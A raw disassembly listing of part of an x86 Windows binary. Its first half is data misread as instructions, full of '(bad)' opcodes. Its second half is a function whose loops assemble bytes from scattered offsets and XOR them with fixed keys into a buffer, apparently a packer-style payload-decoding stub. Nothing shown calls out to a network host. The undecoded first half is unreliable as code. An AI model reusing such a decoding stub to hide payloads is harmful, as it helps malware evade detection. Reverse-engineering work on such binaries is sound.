  4357e6:	jmp    FWORD PTR [edi+0x416a00]
  4357ec:	push   es
  4357ed:	(bad)  
  4357ee:	(bad)  
  4357ef:	jp     0x4357f1
  4357f1:	cmp    BYTE PTR [edx-0x9877],0x5a
  4357f8:	dec    DWORD PTR [esi]
  4357fa:	push   ebx
  4357fb:	call   FWORD PTR [esi]
  4357fd:	inc    DWORD PTR [eax]
  4357ff:	xchg   ebp,eax
  435800:	add    BYTE PTR [esi-0xd],al
  435803:	adc    DWORD PTR [ebx+0x15ffff],0xffffffaf
  43580a:	sub    bh,bh
  43580c:	(bad)  
  43580d:	or     esp,0xffffffe5
  435810:	call   DWORD PTR [esi+0x1e]
  435813:	push   ebx
  435815:	(bad)  
  435816:	dec    DWORD PTR [ebp-0x63c300]
  43581c:	inc    BYTE PTR [eax]
  43581e:	add    BYTE PTR [eax],dl
  435820:	inc    DWORD PTR [eax-0x24ffb2]
  435826:	(bad)  
  435827:	out    dx,eax
  435828:	add    BYTE PTR [eax+0xfcff58],dh
  43582e:	call   DWORD PTR [edx]
  435830:	adc    DWORD PTR [edi-0xfcff43],0xffffffff
  435837:	jae    0x4357bc
  435839:	aas    
  43583a:	imul   eax,DWORD PTR [eax],0xffffffa8
  43583d:	(bad)  
  43583e:	call   DWORD PTR [edi+edi*8+0x28]
  435842:	cmp    edi,edi
  435844:	inc    esi
  435845:	inc    DWORD PTR [eax]
  435847:	dec    ecx
  435848:	call   FWORD PTR [ebx-0x339800ac]
  43584e:	inc    DWORD PTR [esi-0x9ce301]
  435854:	dec    edi
  435855:	or     DWORD PTR [ecx+0xd6bffbc],0xffffffff
  43585c:	mov    esi,0xcc4bffff
  435861:	jle    0x4358c4
  435863:	call   FWORD PTR [edx]
  435865:	inc    DWORD PTR [eax]
  435867:	pop    eax
  435868:	xor    ebx,0xffffff9c
  43586b:	adc    DWORD PTR [esi+0x84ff89],0x17
  435872:	pop    esi
  435873:	or     DWORD PTR [esi-0x1],0xffffffcc
  435877:	icebp  
  435878:	sbb    DWORD PTR [edx-0x6b],0x0
  43587c:	xchg   DWORD PTR [eax],eax
  43587e:	add    ah,ch
  435880:	add    BYTE PTR [edi-0x332c0055],ch
  435886:	call   DWORD PTR [eax-0x26d000]
  43588c:	mov    bl,0xff
  43588e:	add    BYTE PTR [eax+eax*1+0x16],al
  435892:	cmp    eax,0xffff72ff
  435897:	add    bh,bh
  435899:	test   al,0x3d
  43589b:	add    BYTE PTR [edi+edi*8],bh
  43589e:	add    ah,bh
  4358a0:	add    ah,bh
  4358a2:	add    BYTE PTR [ecx-0x62ff0080],cl
  4358a8:	add    BYTE PTR ds:0xa60017,bl
  4358ae:	add    BYTE PTR [ebx],dl
  4358b0:	add    BYTE PTR [edi+0xf0ffa9],cl
  4358b6:	mov    DWORD PTR [ebp-0x7d],ecx
  4358b9:	test   ebp,ecx
  4358bb:	add    BYTE PTR [esi-0x1],dl
  4358be:	mov    ecx,esi
  4358c0:	add    ah,bh
  4358c2:	aaa    
  4358c3:	inc    DWORD PTR [edx]
  4358c5:	cmp    edi,0x7c
  4358c8:	add    BYTE PTR [edx],bl
  4358ca:	cmp    bh,0x82
  4358cd:	add    bh,bh
  4358cf:	test   edi,edi
  4358d1:	div    BYTE PTR [edi]
  4358d3:	add    BYTE PTR [edx],ch
  4358d5:	add    BYTE PTR [ebx+0x5048ff0d],al
  4358db:	add    BYTE PTR [esi],al
  4358dd:	add    bh,bh
  4358df:	call   DWORD PTR fs:[eax+0xb7fff3]
  4358e6:	xor    DWORD PTR [ecx],0x0
  4358e9:	stos   BYTE PTR es:[edi],al
  4358ea:	rol    DWORD PTR [ebx+0x10ffff41],0x0
  4358f1:	xchg   DWORD PTR [ebp-0x7d],ecx
  4358f4:	idiv   edi
  4358f6:	call   FWORD PTR [ecx-0x63e300]
  4358fc:	jl     0x4358fd
  4358fe:	add    BYTE PTR [esi+0xce1583],dh
  435904:	imul   edi,edi,0x7c83bbff
  43590a:	xor    eax,DWORD PTR [ebx-0x203300ff]
  435910:	adc    DWORD PTR [ecx-0xc00a2],0xffffffff
  435917:	jl     0x435918
  435919:	arpl   WORD PTR [edi-0xff4501],di
  43591f:	mov    eax,0xd4dff
  435924:	fdivp  st(7),st
  435926:	add    BYTE PTR [edi],al
  435928:	add    ah,dl
  43592a:	imul   edi,edi,0x9ffffef
  435930:	or     DWORD PTR [ebx],0x75
  435933:	call   DWORD PTR ds:0xff618383
  435939:	jle    0x43590e
  43593b:	jmp    eax
  43593d:	inc    DWORD PTR [eax]
  43593f:	inc    eax
  435940:	adc    DWORD PTR [eax],0xffffffe7
  435943:	call   DWORD PTR [ebx+eax*4-0x7d]
  435947:	sar    bh,cl
  435949:	mov    ah,0x76
  43594b:	jmp    DWORD PTR [edx]
  43594d:	add    BYTE PTR [ebx-0x1d8aff14],al
  435953:	(bad)  
  435954:	std    
  435955:	add    BYTE PTR [eax],al
  435957:	in     al,dx
  435958:	inc    DWORD PTR [edx]
  43595a:	je     0x43595b
  43595c:	adc    eax,DWORD PTR [eax]
  43595e:	add    BYTE PTR [ecx+0x0],ah
  435961:	sbb    bl,BYTE PTR [edx-0xfff201]
  435967:	mov    DWORD PTR ss:[esi],esp
  43596a:	jp     0x43596b
  43596c:	clc    
  43596d:	inc    DWORD PTR [eax]
  43596f:	pusha  
  435970:	add    BYTE PTR [esi],dl
  435972:	add    edi,edi
  435974:	pop    eax
  435975:	add    BYTE PTR [eax],al
  435977:	cwde   
  435978:	add    al,ah
  43597a:	add    al,BYTE PTR [ebx-0x3900ff66]
  435980:	int3   
  435981:	inc    edx
  435982:	or     al,0x83
  435984:	mov    al,0x0
  435986:	jmp    DWORD PTR [ebp+0x27b6cc]
  43598c:	hlt    
  43598d:	(bad)  
  43598e:	call   FWORD PTR [edx-0x77]
  435991:	xor    ecx,DWORD PTR [esi-0x7c004700]
  435997:	iret   
  435998:	jmp    FWORD PTR [edi-0x7100dc]
  43599e:	int3   
  43599f:	pop    ss
  4359a0:	call   DWORD PTR [esi]
  4359a2:	jnp    0x4359a4
  4359a4:	rol    BYTE PTR [eax],cl
  4359a6:	add    BYTE PTR [esi-0x1],dh
  4359a9:	lods   eax,DWORD PTR ds:[esi]
  4359aa:	inc    edi
  4359ab:	add    al,al
  4359ad:	int3   
  4359ae:	jmp    FWORD PTR [edi+edi*8+0x39]
  4359b2:	dec    esp
  4359b3:	sbb    DWORD PTR [ebx-0x7d],0x0
  4359b7:	addr16 (bad) 
  4359b9:	clc    
  4359ba:	jmp    0xffc68448
  4359bf:	test   DWORD PTR [eax],0x70fff5ce
  4359c5:	add    bh,bh
  4359c7:	mov    dl,0x0
  4359c9:	stos   DWORD PTR es:[edi],eax
  4359ca:	and    bh,bh
  4359cc:	sub    edi,edi
  4359ce:	mov    esi,edx
  4359d0:	add    BYTE PTR [ecx+0x8],bl
  4359d3:	xor    DWORD PTR [eax-0x1],0xffffffff
  4359d7:	es xor eax,0x2c
  4359db:	add    BYTE PTR [eax+eax*1-0x1],al
  4359df:	mov    dl,0xff
  4359e1:	sahf   
  4359e2:	jns    0x4359e3
  4359e4:	(bad)  
  4359e5:	(bad)  
  4359e6:	call   DWORD PTR [ecx-0x72237d]
  4359ec:	mov    WORD PTR [eax],es
  4359ee:	sbb    edi,0xffffff89
  4359f1:	dec    esi
  4359f2:	dec    ecx
  4359f3:	inc    edi
  4359f5:	inc    DWORD PTR [ebx-0x7bbc00cc]
  4359fb:	int3   
  4359fc:	mov    ds:0x2483ff,al
  435a01:	sbb    DWORD PTR [ebp+0xffd3ff],ecx
  435a07:	sub    eax,0x7328ff
  435a0c:	mov    al,0x0
  435a0e:	inc    DWORD PTR [edi]
  435a10:	add    BYTE PTR [edi+eiz*2],ah
  435a13:	push   edi
  435a15:	(bad)  
  435a16:	jmp    FWORD PTR [eax+0x0]
  435a19:	adc    dl,dl
  435a1b:	dec    esi
  435a1d:	add    DWORD PTR [eax],0x24
  435a20:	inc    DWORD PTR [edi+0x4c]
  435a23:	dec    esp
  435a25:	inc    DWORD PTR [eax]
  435a27:	fwait
  435a28:	call   DWORD PTR [edx-0x2aff1b]
  435a2e:	inc    DWORD PTR [eax-0x33c5ac01]
  435a34:	leave  
  435a35:	add    DWORD PTR [eax],0x40
  435a38:	dec    DWORD PTR [ecx-0x77]
  435a3b:	push   DWORD PTR [ebx]
  435a3d:	(bad)  
  435a3e:	inc    ebp
  435a40:	mov    edx,ebp
  435a42:	repnz mov DWORD PTR [ebx+0x5dffff],ecx
  435a49:	jbe    0x435a4b
  435a4b:	int3   
  435a4c:	adc    eax,0x896383ff
  435a51:	xchg   edi,eax
  435a52:	int3   
  435a53:	add    BYTE PTR [edx],cl
  435a55:	add    bh,bh
  435a57:	or     al,0xff
  435a59:	xchg   ecx,eax
  435a5a:	sti    
  435a5b:	inc    DWORD PTR [edi]
  435a5d:	(bad)  
  435a5e:	push   DWORD PTR [ebx+eax*4-0x4f]
  435a62:	int    0x0
  435a64:	and    DWORD PTR [ecx+0x7dfff783],ecx
  435a6a:	xor    eax,0xcc9e00
  435a6f:	push   0xffffffff
  435a71:	lods   al,BYTE PTR ds:[esi]
  435a72:	push   eax
  435a73:	add    dl,bh
  435a75:	add    bh,bh
  435a77:	int3   
  435a78:	add    bh,bl
  435a7a:	call   0xffdd:0x8389f989
  435a81:	jns    0x435a4c
  435a83:	(bad)  
  435a84:	jmp    0xfb22:0x839acc00
  435a8b:	jmp    DWORD PTR [ebx-0x7c440100]
  435a91:	loopne 0x435ac5
  435a93:	add    BYTE PTR [eax+eax*1],ah
  435a96:	and    DWORD PTR [esi+0x5a1cff],0xffffffd8
  435a9d:	int3   
  435a9e:	inc    DWORD PTR [ebx-0xd01601]
  435aa4:	lahf   
  435aa5:	(bad)  
  435aa6:	inc    DWORD PTR [ecx]
  435aa8:	call   ecx
  435aaa:	(bad)  
  435aac:	arpl   di,di
  435aae:	add    BYTE PTR [ebp-0x2a2801],cl
  435ab4:	cmp    eax,DWORD PTR [eax]
  435ab6:	(bad)  
  435ab7:	cld    
  435ab8:	add    BYTE PTR [edi+edi*2],cl
  435abb:	dec    DWORD PTR [ecx-0x1]
  435abe:	push   DWORD PTR [ecx]
  435ac0:	jmp    FWORD PTR [eax]
  435ac2:	scas   al,BYTE PTR es:[edi]
  435ac3:	add    dh,bh
  435ac5:	add    bh,bh
  435ac7:	fs int3 
  435ac9:	daa    
  435aca:	pop    edx
  435acb:	int3   
  435acc:	pop    ebx
  435acd:	(bad)  
  435ace:	inc    DWORD PTR [edi-0x5ffd00]
  435ad4:	push   edi
  435ad5:	int3   
  435ad6:	sbb    ebp,0xffffffcc
  435ad9:	std    
  435ada:	pop    edi
  435adb:	jmp    DWORD PTR [eax-0x2d0000]
  435ae1:	xchg   edx,eax
  435ae2:	stos   DWORD PTR es:[edi],eax
  435ae3:	(bad)  
  435ae4:	mov    eax,0x91ffff
  435ae9:	sbb    DWORD PTR [ecx-0x3300a501],esp
  435aef:	sahf   
  435af0:	dec    esp
  435af2:	xchg   BYTE PTR [eax],al
  435af4:	loop   0x435a79
  435af6:	add    BYTE PTR [ebp-0x1],dh
  435af9:	xchg   ebp,eax
  435afa:	push   edx
  435afb:	jmp    DWORD PTR [ecx+0xdfff83]
  435b01:	xchg   edi,eax
  435b02:	jnp    0x435b04
  435b04:	inc    DWORD PTR ds:[eax]
  435b07:	js     0x435b08
  435b09:	ins    BYTE PTR es:[edi],dx
  435b0a:	scas   al,BYTE PTR es:[edi]
  435b0b:	add    BYTE PTR [ebp-0x1],cl
  435b0e:	(bad)  
  435b0f:	sti    
  435b10:	jmp    DWORD PTR [edi+0x67]
  435b13:	add    BYTE PTR [ebx-0x7d],ah
  435b16:	adc    DWORD PTR [edi],0x0
  435b19:	dec    ecx
  435b1a:	stos   DWORD PTR es:[edi],eax
  435b1b:	call   DWORD PTR [edx-0x930000]
  435b21:	xchg   esi,eax
  435b22:	xor    DWORD PTR [ebx+0x4ecc0087],eax
  435b28:	dec    DWORD PTR [eax+0x53]
  435b2b:	add    BYTE PTR [esi-0xe97677],ah
  435b31:	pop    ebx
  435b32:	sar    edi,cl
  435b34:	loopne 0x435b35
  435b36:	add    BYTE PTR [edx-0xd80901],cl
  435b3c:	dec    eax
  435b3d:	(bad)  
  435b3e:	call   DWORD PTR [edi-0x76439934]
  435b44:	aas    
  435b45:	inc    DWORD PTR [eax]
  435b47:	cld    
  435b48:	push   DWORD PTR [edi+eiz*1]
  435b4b:	(bad)  
  435b4c:	stc    
  435b4d:	add    BYTE PTR [ebx-0x3ea700fc],al
  435b53:	add    ch,cl
  435b55:	dec    DWORD PTR [ecx-0x6d047c1f]
  435b5b:	dec    DWORD PTR [ecx-0xca7d00]
  435b61:	lds    esp,FWORD PTR [esi]
  435b63:	add    cl,bh
  435b65:	add    BYTE PTR [eax],al
  435b67:	mov    bl,0xff
  435b69:	test   al,0x9d
  435b6b:	dec    DWORD PTR [esp+ecx*8-0x107c5c7d]
  435b72:	xor    al,0x0
  435b74:	pop    esp
  435b75:	add    BYTE PTR [eax],al
  435b77:	inc    edx
  435b78:	dec    eax
  435b7a:	lock (bad) 
  435b7c:	jg     0x435b7e
  435b7e:	dec    ebp
  435b80:	push   DWORD PTR [esi-0x7cb07c2e]
  435b86:	add    dl,ah
  435b88:	sub    DWORD PTR [eax],0x50
  435b8b:	(bad)  
  435b8c:	in     al,dx
  435b8d:	(bad)  
  435b8e:	(bad)  
  435b8f:	inc    DWORD PTR [eax]
  435b91:	ror    DWORD PTR [edx+0x0],1
  435b94:	pop    edi
  435b95:	add    BYTE PTR [eax],al
  435b97:	xor    eax,DWORD PTR [eax]
  435b99:	ja     0x435b7f
  435b9b:	or     DWORD PTR [edx],0xffffffff
  435b9e:	int3   
  435b9f:	cmp    bh,0x1a
  435ba2:	dec    ebx
  435ba3:	jmp    DWORD PTR [eax+eax*1+0x0]
  435ba7:	stos   BYTE PTR es:[edi],al
  435ba8:	int3   
  435ba9:	cmp    al,0x4f
  435bab:	add    cl,dl
  435bad:	int3   
  435bae:	(bad)  
  435baf:	fcos   
  435bb1:	(bad)  
  435bb2:	or     DWORD PTR ss:0x200000,0x66
  435bba:	fwait
  435bbb:	call   FWORD PTR [esi]
  435bbd:	(bad)  
  435bbe:	(bad)  
  435bbf:	mov    esp,0xffd42783
  435bc4:	jno    0x435bc6
  435bc6:	add    BYTE PTR [ebx],bl
  435bc8:	and    DWORD PTR [esi-0x765d0085],0xffffffff
  435bcf:	std    
  435bd0:	push   DWORD PTR [ebp-0x7c207602]
  435bd6:	inc    DWORD PTR [eax+0x3d05ff]
  435bdc:	imul   eax,DWORD PTR [eax],0xffffff83
  435bdf:	sbb    edi,edi
  435be1:	jnp    0x435bbf
  435be3:	jmp    FWORD PTR [edi+edi*8]
  435be6:	adc    DWORD PTR ds:0xffd9e8ff,0xffffffa9
  435bed:	(bad)  
  435bee:	jmp    FWORD PTR [edi-0xaa4300]
  435bf4:	sub    DWORD PTR [ebx-0xe00e100],eax
  435bfa:	dec    edi
  435bfb:	jmp    DWORD PTR [ecx-0xb80077]
  435c01:	sub    ecx,edi
  435c03:	(bad)  
  435c04:	mov    edx,0xffd60000
  435c09:	lds    eax,FWORD PTR [edx]
  435c0b:	push   eax
  435c0d:	mov    esp,ecx
  435c0f:	add    cl,ah
  435c11:	cld    
  435c12:	mov    cs,esp
  435c14:	das    
  435c15:	inc    DWORD PTR [ebx-0x7186ff3e]
  435c1b:	call   FWORD PTR [edi-0x1]
  435c1e:	call   DWORD PTR [eax+eax*1+0x46]
  435c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c23:	add    ch,cl
  435c25:	(bad)  
  435c26:	push   ebp
  435c28:	mov    DWORD PTR [ebx-0xfc00da],edi
  435c2e:	dec    DWORD PTR [edi+edi*8+0xa8977c1]
  435c35:	(bad)  
  435c36:	(bad)  
  435c37:	cmp    eax,DWORD PTR [eax]
  435c39:	test   BYTE PTR [ebx+eax*4+0x6583ff54],dh
  435c40:	int3   
  435c41:	inc    ebp
  435c42:	jge    0x435bc7
  435c44:	std    
  435c45:	inc    DWORD PTR [eax]
  435c47:	mov    ch,0xcc
  435c49:	mov    bl,0x85
  435c4b:	add    dl,ch
  435c4d:	or     esp,0x5
  435c50:	add    BYTE PTR [esi-0x6b00e4],ah
  435c56:	(bad)  
  435c57:	fdiv   st(7),st
  435c59:	xor    eax,0xff31ffac
  435c5e:	add    dh,bl
  435c60:	dec    DWORD PTR [edx]
  435c62:	in     al,dx
  435c63:	adc    DWORD PTR [ebx+0xeeff00],0x40
  435c6a:	sbb    ecx,esp
  435c6c:	out    dx,al
  435c6d:	inc    DWORD PTR [eax]
  435c6f:	mov    ecx,0x897278ff
  435c74:	sub    DWORD PTR [eax],eax
  435c76:	inc    DWORD PTR [ebp-0x77]
  435c79:	jb     0x435c66
  435c7b:	add    BYTE PTR [esi],dl
  435c7d:	(bad)  
  435c7e:	push   DWORD PTR [eax-0x33eec000]
  435c84:	lock dec DWORD PTR [ecx-0x3e0100b0]
  435c8b:	sbb    DWORD PTR [eax-0x1],0xffffffff
  435c8f:	jne    0x435c90
  435c91:	shr    BYTE PTR ds:0xff0067ff,0x6d
  435c98:	add    BYTE PTR [eax],cl
  435c9a:	push   ebx
  435c9b:	add    BYTE PTR [edx],ah
  435c9d:	(bad)  
  435c9e:	jmp    edi
  435ca0:	add    ah,dh
  435ca2:	rol    BYTE PTR [eax],1
  435ca4:	xor    bh,bh
  435ca6:	dec    DWORD PTR [ebp-0x653501]
  435cac:	jne    0x435c31
  435cae:	dec    esp
  435cb0:	int3   
  435cb1:	out    0xd0,al
  435cb3:	add    ah,bl
  435cb5:	(bad)  
  435cb6:	call   DWORD PTR [eax]
  435cb8:	mov    DWORD PTR [eax],ebx
  435cba:	jp     0x435c45
  435cbc:	arpl   WORD PTR [eax],ax
  435cbe:	jmp    FWORD PTR [ebx+eax*4]
  435cc1:	ret    0xff9c
  435cc4:	ret    
  435cc5:	mov    DWORD PTR [eax],eax
  435cc7:	test   eax,0xff3f28ff
  435ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435ccd:	(bad)  
  435cce:	call   DWORD PTR [ecx+0x0]
  435cd1:	xchg   edi,eax
  435cd2:	xchg   DWORD PTR [eax],eax
  435cd4:	xchg   ecx,eax
  435cd5:	mov    edi,edi
  435cd7:	out    dx,al
  435cd8:	mov    DWORD PTR [ecx+0xa8cc1a],edi
  435cde:	jmp    FWORD PTR [ebp+0x0]
  435ce1:	repz jmp 0x835d:0xccff6a83
  435ce9:	cwde   
  435cea:	test   al,0x0
  435cec:	add    eax,0xffdbff89
  435cf1:	cs out dx,al
  435cf3:	add    dh,dh
  435cf5:	dec    esp
  435cf7:	xlat   BYTE PTR ds:[ebx]
  435cf8:	add    bh,cl
  435cfa:	push   ebx
  435cfb:	dec    DWORD PTR [ebx-0x7c9f7c77]
  435d01:	sub    eax,0x220036
  435d06:	add    BYTE PTR [ecx+ecx*4-0x58],dl
  435d0a:	jns    0x435d0b
  435d0c:	in     al,0x0
  435d0e:	sub    DWORD PTR [edi],0xffffffff
  435d11:	(bad)  [edi-0xff9f00]
  435d17:	aaa    
  435d18:	(bad)  
  435d19:	jns    0x435d24
  435d1b:	jmp    DWORD PTR [edx]
  435d1d:	inc    DWORD PTR [ebx+0x275e00c0]
  435d23:	xor    esi,0xffffffff
  435d26:	int3   
  435d27:	scas   eax,DWORD PTR es:[edi]
  435d28:	jmp    DWORD PTR [esi-0x740012]
  435d2e:	call   FWORD PTR [ecx-0x596900]
  435d34:	mov    ah,0xff
  435d36:	jmp    FWORD PTR [esi+0x0]
  435d39:	out    0xa8,eax
  435d3b:	add    BYTE PTR [edi-0x9bff01],al
  435d41:	shl    DWORD PTR [esi-0x34],1
  435d44:	mov    cl,0xff
  435d46:	sbb    DWORD PTR [edx],0x0
  435d49:	xchg   ecx,eax
  435d4a:	mov    es,WORD PTR [ebx-0x7e007654]
  435d50:	add    BYTE PTR [ecx-0xe9002b],ah
  435d56:	add    BYTE PTR [edi+edi*8-0x6e],cl
  435d5a:	mov    bh,bh
  435d5c:	in     al,dx
  435d5d:	dec    esp
  435d5f:	cmp    al,0x83
  435d61:	leave  
  435d62:	addr16 push eax
  435d65:	(bad)  
  435d66:	inc    DWORD PTR [edi-0x7d]
  435d69:	cmp    eax,0xff678304
  435d6e:	add    BYTE PTR [edi],dl
  435d70:	add    BYTE PTR ds:0xffe0fff4,bl
  435d76:	add    BYTE PTR [eax-0x34],dl
  435d79:	cmp    edi,DWORD PTR [ebx-0x7c330534]
  435d7f:	lahf   
  435d80:	push   ebp
  435d81:	mov    ebp,esp
  435d83:	and    esp,0xfffffff8
  435d86:	sub    esp,0x230
  435d8c:	push   ebx
  435d8d:	push   ebp
  435d8e:	push   esi
  435d8f:	mov    esi,DWORD PTR ds:0x445014
  435d95:	push   edi
  435d96:	push   0x6
  435d98:	push   0x42
  435d9a:	call   esi
  435d9c:	push   0xff
  435da1:	push   0x42
  435da3:	mov    DWORD PTR [esp+0x38],eax
  435da7:	call   esi
  435da9:	push   0x27
  435dab:	push   0x42
  435dad:	mov    DWORD PTR [esp+0x40],eax
  435db1:	call   esi
  435db3:	push   0x12
  435db5:	push   0x42
  435db7:	mov    DWORD PTR [esp+0x44],eax
  435dbb:	call   esi
  435dbd:	mov    edx,DWORD PTR ds:0x448d20
  435dc3:	mov    ecx,DWORD PTR ds:0x44801c
  435dc9:	mov    DWORD PTR [esp+0x34],eax
  435dcd:	add    edx,0x147fc
  435dd3:	mov    esi,0x197
  435dd8:	jmp    0x435de0
  435dda:	lea    ebx,[ebx+0x0]
  435de0:	movzx  eax,BYTE PTR [ecx+0x5]
  435de4:	movzx  edi,BYTE PTR [ecx+0x2]
  435de8:	movzx  ecx,WORD PTR [ecx]
  435deb:	shl    eax,0x8
  435dee:	add    eax,edi
  435df0:	shl    eax,0x10
  435df3:	add    eax,ecx
  435df5:	mov    ecx,0xaba356b3
  435dfa:	sub    ecx,DWORD PTR ds:0x448d1c
  435e00:	mov    ds:0x448d10,eax
  435e05:	xor    ecx,eax
  435e07:	mov    DWORD PTR [edx],ecx
  435e09:	mov    ecx,DWORD PTR ds:0x44801c
  435e0f:	add    ecx,0x8
  435e12:	add    edx,0x4
  435e15:	dec    esi
  435e16:	mov    DWORD PTR ds:0x44801c,ecx
  435e1c:	jne    0x435de0
  435e1e:	call   0x41e0f0
  435e23:	mov    eax,ds:0x448d20
  435e28:	mov    edx,DWORD PTR ds:0x448020
  435e2e:	add    eax,0x11680
  435e33:	mov    esi,0x5b
  435e38:	jmp    0x435e40
  435e3a:	lea    ebx,[ebx+0x0]
  435e40:	movzx  ecx,BYTE PTR [edx+0xa]
  435e44:	movzx  edi,BYTE PTR [edx+0x8]
  435e48:	shl    ecx,0x8
  435e4b:	add    ecx,edi
  435e4d:	movzx  edi,BYTE PTR [edx+0x4]
  435e51:	movzx  edx,BYTE PTR [edx+0x1]
  435e55:	shl    ecx,0x8
  435e58:	add    ecx,edi
  435e5a:	shl    ecx,0x8
  435e5d:	add    ecx,edx
  435e5f:	mov    DWORD PTR ds:0x448d10,ecx
  435e65:	mov    edx,DWORD PTR ds:0x448d1c
  435e6b:	add    edx,0x3d708485
  435e71:	xor    edx,ecx
  435e73:	mov    DWORD PTR [eax],edx
  435e75:	mov    edx,DWORD PTR ds:0x448020
  435e7b:	movzx  ecx,BYTE PTR [edx+0xf]
  435e7f:	movzx  edi,WORD PTR [edx+0xd]
  435e83:	movzx  edx,BYTE PTR [edx+0xb]
  435e87:	shl    ecx,0x10
  435e8a:	add    ecx,edi
  435e8c:	shl    ecx,0x8
  435e8f:	add    ecx,edx
  435e91:	mov    edx,DWORD PTR ds:0x448d1c
  435e97:	xor    edx,ecx
  435e99:	mov    DWORD PTR ds:0x448d10,ecx
  435e9f:	xor    edx,0x3d70878d
  435ea5:	mov    DWORD PTR [eax+0x4],edx
  435ea8:	mov    edx,DWORD PTR ds:0x448020
  435eae:	add    edx,0x10
  435eb1:	mov    DWORD PTR ds:0x448020,edx
  435eb7:	movzx  ecx,BYTE PTR [edx+0xa]
  435ebb:	movzx  edi,BYTE PTR [edx+0x8]
  435ebf:	shl    ecx,0x8
  435ec2:	add    ecx,edi
  435ec4:	movzx  edi,BYTE PTR [edx+0x4]
  435ec8:	movzx  edx,BYTE PTR [edx+0x1]
  435ecc:	shl    ecx,0x8
  435ecf:	add    ecx,edi
  435ed1:	shl    ecx,0x8
  435ed4:	add    ecx,edx
  435ed6:	mov    edx,DWORD PTR ds:0x448d1c
  435edc:	mov    DWORD PTR ds:0x448d10,ecx
  435ee2:	add    edx,0x3d708485
  435ee8:	xor    edx,ecx
  435eea:	mov    DWORD PTR [eax+0x8],edx
  435eed:	mov    edx,DWORD PTR ds:0x448020
  435ef3:	movzx  ecx,BYTE PTR [edx+0xf]
  435ef7:	movzx  edi,WORD PTR [edx+0xd]
  435efb:	movzx  edx,BYTE PTR [edx+0xb]
  435eff:	shl    ecx,0x10
  435f02:	add    ecx,edi
  435f04:	shl    ecx,0x8
  435f07:	add    ecx,edx
  435f09:	mov    edx,DWORD PTR ds:0x448d1c
  435f0f:	xor    edx,ecx
  435f11:	mov    DWORD PTR ds:0x448d10,ecx
  435f17:	xor    edx,0x3d70878d
  435f1d:	mov    DWORD PTR [eax+0xc],edx
  435f20:	mov    edx,DWORD PTR ds:0x448020
  435f26:	add    edx,0x10
  435f29:	mov    DWORD PTR ds:0x448020,edx
  435f2f:	movzx  ecx,BYTE PTR [edx+0xa]
  435f33:	movzx  edi,BYTE PTR [edx+0x8]
  435f37:	shl    ecx,0x8
  435f3a:	add    ecx,edi
  435f3c:	movzx  edi,BYTE PTR [edx+0x4]
  435f40:	movzx  edx,BYTE PTR [edx+0x1]
  435f44:	shl    ecx,0x8
  435f47:	add    ecx,edi
  435f49:	shl    ecx,0x8
  435f4c:	add    ecx,edx
  435f4e:	mov    edx,DWORD PTR ds:0x448d1c
  435f54:	add    edx,0x3d708485
  435f5a:	xor    edx,ecx
  435f5c:	mov    DWORD PTR ds:0x448d10,ecx
  435f62:	mov    DWORD PTR [eax+0x10],edx
  435f65:	mov    edx,DWORD PTR ds:0x448020
  435f6b:	movzx  ecx,BYTE PTR [edx+0xf]
  435f6f:	movzx  edi,WORD PTR [edx+0xd]
  435f73:	shl    ecx,0x10
  435f76:	movzx  edx,BYTE PTR [edx+0xb]
  435f7a:	add    ecx,edi
  435f7c:	shl    ecx,0x8
  435f7f:	add    ecx,edx
  435f81:	mov    edx,DWORD PTR ds:0x448d1c
  435f87:	xor    edx,ecx
  435f89:	mov    DWORD PTR ds:0x448d10,ecx
  435f8f:	xor    edx,0x3d70878d
  435f95:	mov    DWORD PTR [eax+0x14],edx
  435f98:	mov    edx,DWORD PTR ds:0x448020
  435f9e:	add    edx,0x10
  435fa1:	mov    DWORD PTR ds:0x448020,edx
  435fa7:	movzx  ecx,BYTE PTR [edx+0xa]
  435fab:	movzx  edi,BYTE PTR [edx+0x8]
  435faf:	shl    ecx,0x8
  435fb2:	add    ecx,edi
  435fb4:	movzx  edi,BYTE PTR [edx+0x4]
  435fb8:	movzx  edx,BYTE PTR [edx+0x1]
  435fbc:	shl    ecx,0x8
  435fbf:	add    ecx,edi
  435fc1:	shl    ecx,0x8
  435fc4:	add    ecx,edx
  435fc6:	mov    edx,DWORD PTR ds:0x448d1c
  435fcc:	add    edx,0x3d708485
  435fd2:	xor    edx,ecx
  435fd4:	mov    DWORD PTR ds:0x448d10,ecx
  435fda:	mov    DWORD PTR [eax+0x18],edx
  435fdd:	mov    edx,DWORD PTR ds:0x448020
  435fe3:	movzx  ecx,BYTE PTR [edx+0xf]
  435fe7:	movzx  edi,WORD PTR [edx+0xd]
  435feb:	movzx  edx,BYTE PTR [edx+0xb]
  435fef:	shl    ecx,0x10
  435ff2:	add    ecx,edi
  435ff4:	shl    ecx,0x8
  435ff7:	add    ecx,edx
  435ff9:	mov    edx,DWORD PTR ds:0x448d1c
  435fff:	xor    edx,ecx
  436001:	xor    edx,0x3d70878d
  436007:	mov    DWORD PTR ds:0x448d10,ecx
  43600d:	mov    DWORD PTR [eax+0x1c],edx
  436010:	mov    edx,DWORD PTR ds:0x448020
  436016:	add    edx,0x10
  436019:	add    eax,0x20
  43601c:	dec    esi
  43601d:	mov    DWORD PTR ds:0x448020,edx
  436023:	jne    0x435e40
  436029:	mov    edx,DWORD PTR ds:0x448d20
  43602f:	mov    ecx,DWORD PTR ds:0x448024
  436035:	add    edx,0x121e0
  43603b:	mov    esi,0x12d
  436040:	movzx  eax,BYTE PTR [ecx+0x5]
  436044:	movzx  edi,BYTE PTR [ecx+0x2]
  436048:	movzx  ecx,WORD PTR [ecx]
  43604b:	shl    eax,0x8
  43604e:	add    eax,edi
  436050:	shl    eax,0x10
  436053:	add    eax,ecx
  436055:	mov    ecx,DWORD PTR ds:0x448d1c
  43605b:	add    ecx,0x97ace937
  436061:	xor    ecx,eax
  436063:	mov    ds:0x448d10,eax
  436068:	mov    DWORD PTR [edx],ecx
  43606a:	mov    ecx,DWORD PTR ds:0x448024
  436070:	add    ecx,0x8
  436073:	add    edx,0x4
  436076:	dec    esi
  436077:	mov    DWORD PTR ds:0x448024,ecx
  43607d:	jne    0x436040
  43607f:	mov    esi,DWORD PTR ds:0x448d20
  436085:	mov    ebp,DWORD PTR ds:0x445020
  43608b:	lea    edx,[esp+0x10]
  43608f:	push   edx
  436090:	lea    eax,[esp+0x1c]
  436094:	push   eax
  436095:	lea    ecx,[esp+0x30]
  436099:	push   ecx
  43609a:	lea    edx,[esp+0x2c]
  43609e:	push   edx
